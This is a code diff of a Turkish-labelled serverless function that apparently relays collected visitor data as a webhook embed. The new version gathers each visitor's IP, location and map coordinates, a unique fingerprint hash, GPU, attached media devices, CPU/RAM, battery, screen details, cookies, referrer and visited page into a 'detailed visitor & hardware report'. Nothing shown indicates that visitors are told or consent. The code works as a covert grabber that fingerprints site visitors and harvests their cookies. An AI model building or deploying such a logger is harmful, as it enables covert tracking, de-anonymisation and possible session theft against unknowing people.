@@ -1,42 +1,51 @@
 exports.handler = async (event, context) => {
-  // 1. IP Tespiti (Client-side IP -> Cloudflare -> Netlify -> Header)
-  const queryIp = event.queryStringParameters ? event.queryStringParameters.ip : null;
-  const rawIp = queryIp || 
-                event.headers['cf-connecting-ip'] || 
-                event.headers['x-nf-client-connection-ip'] || 
-                event.headers['x-forwarded-for'] || 
-                'Bilinmiyor';
-
-  const clientIp = rawIp.split(',')[0].trim();
-
-  let country = event.headers['x-country'] || 'Bilinmiyor';
-  let city = event.headers['x-city'] || 'Bilinmiyor';
-  let isp = 'Bilinmiyor';
-
-  if (clientIp !== 'Bilinmiyor') {
-    try {
-      // HTTP üzerinden limitsiz ve ultra hızlı ip-api.com sorgusu
-      const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,city,isp,org`);
-      const geoData = await geoRes.json();
-
-      if (geoData.status === 'success') {
-        country = geoData.country || country;
-        city = geoData.city || city;
-        isp = geoData.isp || geoData.org || 'Bilinmiyor';
-      }
-    } catch (e) {
-      console.error("GeoIP hatasi:", e);
+  let data = {};
+  try {
+    if (event.body) {
+      data = JSON.parse(event.body);
     }
-  }
+  } catch (e) {}
 
   const embed = {
-    title: "🚀 Yeni Ziyaretçi Tespit Edildi",
-    color: 4690392,
+    title: "📊 Detaylı Ziyaretçi & Donanım Raporu",
+    color: 3447003,
     fields: [
-      { name: "IP Adresi", value: clientIp, inline: true },
-      { name: "Ülke / Şehir", value: `${country} / ${city}`, inline: true },
-      { name: "İnternet Sağlayıcı (ISP)", value: isp, inline: false },
-      { name: "User-Agent", value: event.headers['user-agent'] || 'Bilinmiyor', inline: false }
+      {
+        name: "🌐 Ağ & Konum Bilgileri",
+        value: 
+          `**IP Adresi:** ${data.ip || 'Bilinmiyor'}\n` +
+          `**Konum:** ${data.location || 'Bilinmiyor'}\n` +
+          `**Zaman Dilimi:** ${data.timezone || 'Bilinmiyor'}\n` +
+          `**İSS & ASN:** ${data.isp || 'Bilinmiyor'}\n` +
+          `**Koordinatlar:** ${data.coords ? `[Haritada Gör](${data.coords})` : 'Bilinmiyor'}`
+      },
+      {
+        name: "💻 Donanım, Medya & Parmak İzi",
+        value: 
+          `**Benzersiz Parmak İzi (Hash):** \`${data.fingerprint || 'Bilinmiyor'}\`\n` +
+          `**Ekran Kartı (GPU):** ${data.gpu || 'Bilinmiyor'}\n` +
+          `**Takılı Medya Cihazları:** ${data.media || 'Bilinmiyor'}\n` +
+          `**İşletim Sistemi / Platform:** ${data.platform || 'Bilinmiyor'}\n` +
+          `**Donanım (CPU / RAM):** ${data.hardware || 'Bilinmiyor'}\n` +
+          `**Batarya:** ${data.battery || 'Bilinmiyor'}`
+      },
+      {
+        name: "🖥️ Ekran & Dokunmatik",
+        value: 
+          `**Ekran:** ${data.screen || 'Bilinmiyor'}\n` +
+          `**Pencere:** ${data.windowSize || 'Bilinmiyor'}\n` +
+          `**Renk / Piksel:** ${data.colorDepth || 'Bilinmiyor'}\n` +
+          `**Dokunmatik Ekran:** ${data.touch || 'Bilinmiyor'}`
+      },
+      {
+        name: "🌐 Tarayıcı & Oturum Bilgileri",
+        value: 
+          `**Tarayıcı Dilleri:** ${data.languages || 'Bilinmiyor'}\n` +
+          `**Çerezler:** ${data.cookies || 'Bilinmiyor'}\n` +
+          `**Geldiği Yer (Referrer):** ${data.referrer || 'Doğrudan Giriş'}\n` +
+          `**Ziyaret Edilen Sayfa:** ${data.url || 'Bilinmiyor'}\n` +
+          `**User-Agent:** \`${event.headers['user-agent'] || 'Bilinmiyor'}\``
+      }
     ],
     timestamp: new Date().toISOString()
   };
